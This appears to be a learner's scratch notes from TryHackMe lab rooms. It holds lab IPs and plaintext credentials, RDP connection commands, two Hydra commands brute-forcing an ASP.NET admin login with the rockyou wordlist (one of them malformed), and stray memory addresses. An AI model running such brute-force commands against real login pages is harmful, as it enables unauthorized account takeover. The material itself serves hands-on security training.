IP Address: **10.10.49.23**

Username: **cmnatic**

Password: **yararules!**

SSH Port: **22**

`rdesktop -u username -f IP`

xfreerdp
best rdp soffware


xfreerdp /u:Analysis /p:Tryhackme123! /v:10.10.140.138 
Username: Administrator

Password: BHN2UVw0Q
xfreerdp /u:Administrator /p:BHN2UVw0Q /v:10.10.214.145



http://10.10.180.60/Account/login.aspx?ReturnURL=%2fadmin%2f

hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 
10.10.214.145 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.180.60
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 754
Origin: http://10.10.180.60
DNT: 1
Connection: close
Referer: http://10.10.180.60/Account/login.aspx?ReturnURL=%2fadmin%2f
Upgrade-Insecure-Requests: 1

__VIEWSTATE=E5YPEg0DkjC%2B5ayJFm%2FBcd0cqk4g9KD9iZ0vHNNYHDQcaV2PMJz1s05zinB94MMBUS0qRC1pXgEuGVGqGPjaR6%2FMYnR52S9HjZ8n7lAHuT0%2BABYffLk5r%2FqXO6Jdtr7Kr09CFZV5qjTctiVb%2FgGqIVb6aIeeloG093tnWWsiNfd97M8wctRqGPyLXbFGqpwZcJT8fjGomlzV9ZlfHOED40TURbh0NCvPJG2zpb37n8wcXGrBJPc5nZLI5PI9ayl3WT%2B%2FUk5fKv7A9kvT4A8rUxCAID9QPPcmlozPwntjdbXy2vjWiD4jgrBUOvnarg%2FW%2BH9vsQTtUWrJf2tfDO5BBBa9xP4O6yY4E0tWbBfpS96sLN8q&__EVENTVALIDATION=ePsk74eOlQvDKNJ5KrhTGuoeZ0FPm2aD4QMx7BXsr22%2FHnU%2FBTCT2wv2oUo7edqq2tZd1j%2FMyMEyZo1FhKVpCxq%2BEWHipYNWVlCq7QaIBP1UFy8yKa27j%2FGRIB0arrkjRZyKgZd4vmXSoc498hBOfrMjfu1w2yomnnC6YuOGWb5Di2GB&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^www^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"


hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 10.10.214.145 "/http-post-form “/Account/login.aspx:__VIEWSTATE=X%2Fz3Mlty62z5Y8aCAMiDaFe%2B9SKdcf9226N9xQ01mq8rP30ZJRq5G7EwUwzkz3n9rzEXVYmhE%2BBRVjtKpusOG%2BclmdkWeaN46I%2FnUYO4uzqLV1jka6wmsfIKFhEdwy3oeh7DlUj8VUnfKjmAAhl6QNzNfhdXj13D13LFPh9wtvnHyBjYmqMzxEvWAL1mwoNVWxVTCra5DFu1l1gLSNfWkrXLzo7bQdYCnhV2xxpLa1JgaLGsxDUS3h25czmU7g3MCciYGEAgFFxv%2FATyhDiIQBlHJ154WMYnL52cM7MR81pZZNgK32WdRwy%2FvA2wQvi6YrjkLrEZsiepbdoKvQHZ6qqyPxH0j6K9BI3%2FlKKiT2cfS1Nm&__EVENTVALIDATION=tbMSuN0fZZiffwoWR2502NvWLKSDwmGhtVGh9KB%2FIf6hdNVf9UjamY4uMbjjKFAInyLeK%2Fz5%2ByO1yrvO44pVUZTCisUdcMS2k59fRgxCJ9mU9waI%2BiHVLyhzWS22LViSMdGRUhHURt84Cg9MNCxXY172nJrVA5WtJ7PavxhpRlqV8Wi3&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed” -t 64



0x8049208

0xffffce0c 
0xffffce0c 

0xffffce3c




